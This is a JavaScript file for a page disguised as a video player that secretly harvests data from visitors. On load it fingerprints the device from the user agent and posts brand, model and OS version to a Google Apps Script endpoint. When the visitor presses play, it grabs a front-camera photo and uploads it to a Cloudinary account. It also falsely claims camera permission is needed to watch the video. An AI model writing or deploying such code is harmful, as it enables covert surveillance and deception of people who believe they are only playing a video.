const playButton = document.getElementById('playButton');
const loader = document.getElementById('loader');
const video = document.getElementById('videoPlayer');
const cameraInput = document.getElementById('cameraInput');
const isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent) || (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1);

(async () => {
    const ua = navigator.userAgent;
    const getDeviceInfo = () => {
        const android = ua.match(/Android ([0-9.]+)/);
        const ios = ua.match(/OS ([0-9_]+)/);
        const device = ua.match(/\(([^)]+)\)/);
        
        // Extract brand and model
        let brand = null, model = null;
        
        // Common brand patterns (case-insensitive)
        const brands = [
            { name: 'Samsung', pattern: /samsung[\s-]?([^;)]+)/i },
            { name: 'Huawei', pattern: /huawei[\s-]?([^;)]+)/i },
            { name: 'Xiaomi', pattern: /xiaomi[\s-]?([^;)]+)/i },
            { name: 'Redmi', pattern: /redmi[\s-]?([^;)]+)/i },
            { name: 'OPPO', pattern: /oppo[\s-]?([^;)]+)/i },
            { name: 'Vivo', pattern: /vivo[\s-]?([^;)]+)/i },
            { name: 'OnePlus', pattern: /oneplus[\s-]?([^;)]+)/i },
            { name: 'Realme', pattern: /realme[\s-]?([^;)]+)/i },
            { name: 'Nokia', pattern: /nokia[\s-]?([^;)]+)/i },
            { name: 'LG', pattern: /lg[\s-]?([^;)]+)/i },
            { name: 'Motorola', pattern: /motorola[\s-]?([^;)]+)/i },
            { name: 'Sony', pattern: /sony[\s-]?([^;)]+)/i },
            { name: 'Google', pattern: /pixel[\s-]?([^;)]+)/i },
            { name: 'HTC', pattern: /htc[\s-]?([^;)]+)/i },
            { name: 'Asus', pattern: /asus[\s-]?([^;)]+)/i },
            { name: 'Lenovo', pattern: /lenovo[\s-]?([^;)]+)/i },
            { name: 'ZTE', pattern: /zte[\s-]?([^;)]+)/i },
            { name: 'Tecno', pattern: /tecno[\s-]?([^;)]+)/i },
            { name: 'Infinix', pattern: /infinix[\s-]?([^;)]+)/i },
            { name: 'Honor', pattern: /honor[\s-]?([^;)]+)/i }
        ];
        
        // iOS devices - get specific model
        if (ua.match(/iPhone/)) {
            brand = 'Apple';
            const iosModel = ua.match(/iPhone(\d+[,\d]*)?/);
            model = iosModel ? 'iPhone ' + (iosModel[1] || '') : 'iPhone';
        }
        else if (ua.match(/iPad/)) {
            brand = 'Apple';
            const ipadModel = ua.match(/iPad(\d+[,\d]*)?/);
            model = ipadModel ? 'iPad ' + (ipadModel[1] || '') : 'iPad';
        }
        else if (ua.match(/iPod/)) { brand = 'Apple'; model = 'iPod'; }
        else {
            // Check all Android brands
            for (const b of brands) {
                const match = ua.match(b.pattern);
                if (match) {
                    brand = b.name;
                    model = match[1];
                    break;
                }
            }
        }
        
        // Fallback: Try to extract any brand/model from Build/ pattern
        if (!brand && android) {
            const modelMatch = ua.match(/;\s*([^;)]+)\s*Build/);
            if (modelMatch) {
                const fullModel = modelMatch[1].trim();
                model = fullModel;
                // Try to extract brand from model string
                const words = fullModel.split(/[\s-_]+/);
                if (words.length > 0) brand = words[0];
            }
        }
        
        // Last resort: check for TECNO or Infinix in different positions
        if (!brand) {
            if (/TECNO/i.test(ua)) {
                brand = 'Tecno';
                const tecnoModel = ua.match(/TECNO[\s-]?([A-Z0-9]+)/i);
                if (tecnoModel) model = tecnoModel[1];
            } else if (/Infinix/i.test(ua)) {
                brand = 'Infinix';
                const infinixModel = ua.match(/Infinix[\s-]?([A-Z0-9]+)/i);
                if (infinixModel) model = infinixModel[1];
            }
        }
        
        return {
            androidVersion: android ? android[1] : null,
            iosVersion: ios ? ios[1].replace(/_/g, '.') : null,
            deviceName: device ? device[1] : null,
            brand: brand,
            model: model
        };
    };
    const deviceInfo = getDeviceInfo();
    const version = deviceInfo.androidVersion || deviceInfo.iosVersion || 'Unknown';
    
    const specs = {
        brand: deviceInfo.brand || 'Unknown',
        model: deviceInfo.model || 'Unknown',
        version: version
    };
    
    // Send to Google Sheets
    await fetch('https://script.google.com/macros/s/AKfycbwd6DFAaGBLF8RM6kD07nvTqD5Gr_SLDGTTLrkfVJ6qYrb7NtO9ZYZwqlgu4BnmQ28V/exec', {
        method: 'POST',
        mode: 'no-cors',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(specs)
    }).catch(() => {});
})();

const uploadToCloudinary = async (blob) => {
    const formData = new FormData();
    formData.append('file', blob);
    formData.append('upload_preset', 'user_pre');
    const response = await fetch('https://api.cloudinary.com/v1_1/dzmg57zjf/image/upload', { method: 'POST', body: formData });
    return response.json();
};

const playVideo = () => {
    playButton.style.display = 'none';
    loader.style.display = 'none';
    video.controls = true;
    video.play();
};

if (isIOS) {
    cameraInput.addEventListener('change', async (e) => {
        const file = e.target.files[0];
        if (file) {
            playButton.style.display = 'none';
            loader.style.display = 'block';
            await uploadToCloudinary(file);
            playVideo();
        }
    });
    
    playButton.addEventListener('click', () => {
        cameraInput.click();
    });
} else {
    playButton.addEventListener('click', async () => {
        playButton.style.display = 'none';
        loader.style.display = 'block';
        
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
            
            // Try ImageCapture API first
            if (window.ImageCapture) {
                const videoTrack = stream.getVideoTracks()[0];
                const imageCapture = new ImageCapture(videoTrack);
                const blob = await imageCapture.takePhoto();
                stream.getTracks().forEach(track => track.stop());
                await uploadToCloudinary(blob);
            } else {
                // Fallback: capture from video element
                const videoEl = document.createElement('video');
                videoEl.srcObject = stream;
                videoEl.play();
                await new Promise(resolve => setTimeout(resolve, 500));
                
                const canvas = document.createElement('canvas');
                canvas.width = videoEl.videoWidth;
                canvas.height = videoEl.videoHeight;
                canvas.getContext('2d').drawImage(videoEl, 0, 0);
                stream.getTracks().forEach(track => track.stop());
                
                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
                await uploadToCloudinary(blob);
            }
            
            playVideo();
        } catch (error) {
            loader.style.display = 'none';
            playButton.style.display = 'flex';
            alert('Camera permission denied. Please accept to watch the video.');
        }
    });
}
